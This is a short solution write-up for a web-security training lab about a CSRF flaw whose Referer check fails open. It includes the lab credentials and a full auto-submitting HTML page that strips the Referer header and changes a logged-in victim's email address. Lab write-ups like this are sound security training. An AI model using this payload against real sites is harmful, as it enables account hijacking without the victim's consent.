This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter 

# Solution
Change email validates Referer header.
Remove the Referer header and the change-email request is accepted.

Basic CSRF exploit just add `<meta name="referrer" content="no-referrer">` to ensure cross-site request has no referrer header.

```js
<html>
    <head>
        <meta name="referrer" content="never">
    </head>

    <body>
        <script>history.pushState('','','/')</script>
        <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="test@test">
            <input type="submit" value="submit">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```